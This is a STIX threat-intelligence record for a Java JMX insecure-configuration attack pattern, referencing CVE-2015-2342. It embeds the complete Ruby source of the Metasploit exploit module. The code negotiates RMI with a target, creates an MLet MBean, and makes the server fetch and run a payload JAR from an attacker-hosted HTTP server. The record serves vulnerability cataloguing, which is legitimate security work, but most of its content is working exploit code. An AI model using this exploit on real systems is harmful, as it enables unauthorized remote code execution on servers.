{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--401cb780-9db3-400c-8298-f26deb1866a2",
    "created": "2024-08-14T17:06:33.359717Z",
    "modified": "2024-08-14T17:06:33.359721Z",
    "name": "Java JMX Server Insecure Configuration Java Code Execution",
    "description": " This module takes advantage a Java JMX interface insecure configuration, which would",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/java_jmx_server.rb",
            "external_id": "java_jmx_server.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.oracle.com/javase/8/docs/technotes/guides/jmx/JMX_1_4_specification.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.optiv.com/blog/exploiting-jmx-rmi"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2342"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::Java::Rmi::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Java JMX Server Insecure Configuration Java Code Execution',\n      'Description'    => %q{\n        This module takes advantage a Java JMX interface insecure configuration, which would\n        allow loading classes from any remote (HTTP) URL. JMX interfaces with authentication\n        disabled (com.sun.management.jmxremote.authenticate=false) should be vulnerable, while\n        interfaces with authentication enabled will be vulnerable only if a weak configuration\n        is deployed (allowing to use javax.management.loading.MLet, having a security manager\n        allowing to load a ClassLoader MBean, etc.).\n      },\n      'Author'         =>\n        [\n          'Braden Thomas', # Attack vector discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'https://docs.oracle.com/javase/8/docs/technotes/guides/jmx/JMX_1_4_specification.pdf'],\n          ['URL', 'https://www.optiv.com/blog/exploiting-jmx-rmi'],\n          ['CVE', '2015-2342']\n        ],\n      'Platform'       => 'java',\n      'Arch'           => ARCH_JAVA,\n      'Privileged'     => false,\n      'Payload'        => { 'BadChars' => '', 'DisableNops' => true },\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 10\n        },\n      'Targets'        =>\n        [\n          [ 'Generic (Java Payload)', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-05-22'\n    ))\n\n    register_options([\n      Msf::OptString.new('JMX_ROLE', [false, 'The role to interact with an authenticated JMX endpoint']),\n      Msf::OptString.new('JMX_PASSWORD', [false, 'The password to interact with an authenticated JMX endpoint']),\n      Msf::OptString.new('JMXRMI', [true, 'The name where the JMX RMI interface is bound', 'jmxrmi'])\n    ])\n    register_common_rmi_ports_and_services\n  end\n\n  def post_auth?\n    true\n  end\n\n  def on_request_uri(cli, request)\n    if @jar.nil?\n      p = regenerate_payload(cli)\n      @jar = p.encoded_jar({random:true})\n      paths = [\n        [\"metasploit\", \"JMXPayloadMBean.class\"],\n        [\"metasploit\", \"JMXPayload.class\"],\n      ]\n\n      @jar.add_file('metasploit/', '')\n      paths.each do |path_parts|\n        path = ['java', path_parts].flatten.join('/')\n        contents = ::MetasploitPayloads.read(path)\n        @jar.add_file(path_parts.join('/'), contents)\n      end\n    end\n\n    if request.uri =~ /mlet$/\n      jar = \"#{rand_text_alpha(8 + rand(8))}.jar\"\n\n      mlet = \"<HTML><mlet code=\\\"#{@jar.substitutions[\"metasploit\"]}.JMXPayload\\\" \"\n      mlet << \"archive=\\\"#{jar}\\\" \"\n      mlet << \"name=\\\"#{@mlet}:name=jmxpayload,id=1\\\" \"\n      mlet << \"codebase=\\\"#{get_uri}\\\"></mlet></HTML>\"\n      send_response(cli, mlet,\n        {\n          'Content-Type' => 'application/octet-stream',\n          'Pragma'       => 'no-cache'\n        })\n\n      print_status(\"Replied to request for mlet\")\n    elsif request.uri =~ /\\.jar$/i\n      send_response(cli, @jar.pack,\n        {\n          'Content-Type' => 'application/java-archive',\n          'Pragma'       => 'no-cache'\n        })\n      print_status(\"Replied to request for payload JAR\")\n    end\n  end\n\n  def autofilter\n    return true\n  end\n\n  def check\n    connect\n\n    unless is_rmi?\n      return Exploit::CheckCode::Safe\n    end\n\n    mbean_server = discover_endpoint\n    disconnect\n    if mbean_server.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    connect(true, { 'RHOST' => mbean_server[:address], 'RPORT' => mbean_server[:port] })\n    unless is_rmi?\n      return Exploit::CheckCode::Unknown\n    end\n\n    jmx_endpoint = handshake(mbean_server)\n    disconnect\n    if jmx_endpoint.nil?\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    vprint_status(\"Starting service...\")\n    start_service\n\n    @mlet = \"MLet#{rand_text_alpha(8 + rand(4)).capitalize}\"\n    connect\n\n    print_status(\"Sending RMI Header...\")\n    unless is_rmi?\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to negotiate RMI protocol\")\n    end\n\n    print_status(\"Discovering the JMXRMI endpoint...\")\n    mbean_server = discover_endpoint\n    disconnect\n    if mbean_server.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to discover the JMXRMI endpoint\")\n    else\n      print_good(\"JMXRMI endpoint on #{mbean_server[:address]}:#{mbean_server[:port]}\")\n    end\n\n    # First try to connect to the original RHOST, since the mbean address may be inaccessible\n    begin\n      connect(true, { 'RPORT' => mbean_server[:port] })\n    rescue Rex::ConnectionError\n      # If that fails, try connecting to the listed address instead\n      connect(true, { 'RHOST' => mbean_server[:address], 'RPORT' => mbean_server[:port] })\n    end\n\n    unless is_rmi?\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to negotiate RMI protocol with the MBean server\")\n    end\n\n    print_status(\"Proceeding with handshake...\")\n    jmx_endpoint = handshake(mbean_server)\n    if jmx_endpoint.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to handshake with the MBean server\")\n    else\n      print_good(\"Handshake with JMX MBean server on #{jmx_endpoint[:address]}:#{jmx_endpoint[:port]}\")\n    end\n\n    print_status(\"Loading payload...\")\n    unless load_payload(jmx_endpoint)\n      fail_with(Failure::Unknown, \"#{peer} - Failed to load the payload\")\n    end\n\n    print_status(\"Executing payload...\")\n    send_jmx_invoke(\n      object_number: jmx_endpoint[:object_number],\n      uid_number: jmx_endpoint[:uid].number,\n      uid_time: jmx_endpoint[:uid].time,\n      uid_count: jmx_endpoint[:uid].count,\n      object: \"#{@mlet}:name=jmxpayload,id=1\",\n      method: 'run'\n    )\n    disconnect\n  end\n\n  def is_rmi?\n    send_header\n    ack = recv_protocol_ack\n    if ack.nil?\n      return false\n    end\n\n    true\n  end\n\n  def discover_endpoint\n    rmi_classes_and_interfaces = [\n      'javax.management.remote.rmi.RMIConnectionImpl',\n      'javax.management.remote.rmi.RMIConnectionImpl_Stub',\n      'javax.management.remote.rmi.RMIConnector',\n      'javax.management.remote.rmi.RMIConnectorServer',\n      'javax.management.remote.rmi.RMIIIOPServerImpl',\n      'javax.management.remote.rmi.RMIJRMPServerImpl',\n      'javax.management.remote.rmi.RMIServerImpl',\n      'javax.management.remote.rmi.RMIServerImpl_Stub',\n      'javax.management.remote.rmi.RMIConnection',\n      'javax.management.remote.rmi.RMIServer'\n    ]\n    ref = send_registry_lookup(name: datastore['JMXRMI'])\n    return nil if ref.nil?\n\n    unless rmi_classes_and_interfaces.include? ref[:object]\n      vprint_error(\"JMXRMI discovery returned unexpected object #{ref[:object]}\")\n      return nil\n    end\n\n    ref\n  end\n\n  def handshake(mbean)\n    begin\n      opts = {\n        object_number: mbean[:object_number],\n        uid_number: mbean[:uid].number,\n        uid_time: mbean[:uid].time,\n        uid_count: mbean[:uid].count\n      }\n\n      if datastore['JMX_ROLE']\n        username = datastore['JMX_ROLE']\n        password = datastore['JMX_PASSWORD']\n        opts.merge!(username: username, password: password)\n      end\n\n      ref = send_new_client(opts)\n    rescue ::Rex::Proto::Rmi::Exception => e\n      vprint_error(\"JMXRMI discovery raised an exception of type #{e.message}\")\n      return nil\n    end\n\n    ref\n  end\n\n  def load_payload(conn_stub)\n    vprint_status(\"Getting JMXPayload instance...\")\n\n    begin\n      res = send_jmx_get_object_instance(\n        object_number: conn_stub[:object_number],\n        uid_number: conn_stub[:uid].number,\n        uid_time: conn_stub[:uid].time,\n        uid_count: conn_stub[:uid].count,\n        name: \"#{@mlet}:name=jmxpayload,id=1\"\n      )\n    rescue ::Rex::Proto::Rmi::Exception => e\n      case e.message\n      when 'javax.management.InstanceNotFoundException'\n        vprint_warning(\"JMXPayload instance not found, trying to load\")\n        return load_payload_from_url(conn_stub)\n      else\n        vprint_error(\"getObjectInstance returned unexpected exception #{e.message}\")\n        return false\n      end\n    end\n\n\n    return false if res.nil?\n\n    true\n  end\n\n  def load_payload_from_url(conn_stub)\n    vprint_status(\"Creating javax.management.loading.MLet MBean...\")\n\n    begin\n      res = send_jmx_create_mbean(\n        object_number: conn_stub[:object_number],\n        uid_number: conn_stub[:uid].number,\n        uid_time: conn_stub[:uid].time,\n        uid_count: conn_stub[:uid].count,\n        name: 'javax.management.loading.MLet'\n      )\n    rescue ::Rex::Proto::Rmi::Exception => e\n      case e.message\n      when 'javax.management.InstanceAlreadyExistsException'\n        vprint_good(\"javax.management.loading.MLet already exists\")\n        res = true\n      when 'java.lang.SecurityException'\n        vprint_error(\" The provided user hasn't enough privileges\")\n        res = nil\n      else\n        vprint_error(\"createMBean raised unexpected exception #{e.message}\")\n        res = nil\n      end\n    end\n\n    if res.nil?\n      vprint_error(\"The request to createMBean failed\")\n      return false\n    end\n\n    vprint_status(\"Getting javax.management.loading.MLet instance...\")\n    begin\n      res = send_jmx_get_object_instance(\n        object_number: conn_stub[:object_number],\n        uid_number: conn_stub[:uid].number,\n        uid_time: conn_stub[:uid].time,\n        uid_count: conn_stub[:uid].count,\n        name: 'DefaultDomain:type=MLet'\n      )\n    rescue ::Rex::Proto::Rmi::Exception => e\n      vprint_error(\"getObjectInstance returned unexpected exception: #{e.message}\")\n      return false\n    end\n\n    if res.nil?\n      vprint_error(\"The request to GetObjectInstance failed\")\n      return false\n    end\n\n    vprint_status(\"Loading MBean Payload with javax.management.loading.MLet#getMBeansFromURL...\")\n\n    begin\n      res = send_jmx_invoke(\n        object_number: conn_stub[:object_number],\n        uid_number: conn_stub[:uid].number,\n        uid_time: conn_stub[:uid].time,\n        uid_count: conn_stub[:uid].count,\n        object: 'DefaultDomain:type=MLet',\n        method: 'getMBeansFromURL',\n        args: { 'java.lang.String' => \"#{get_uri}/mlet\" }\n      )\n    rescue ::Rex::Proto::Rmi::Exception => e\n      vprint_error(\"invoke() returned unexpected exception: #{e.message}\")\n      return false\n    end\n\n    if res.nil?\n      vprint_error(\"The call to getMBeansFromURL failed\")\n      return false\n    end\n\n    true\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-05-22",
    "x_mitre_platforms": [
        "java'"
    ]
}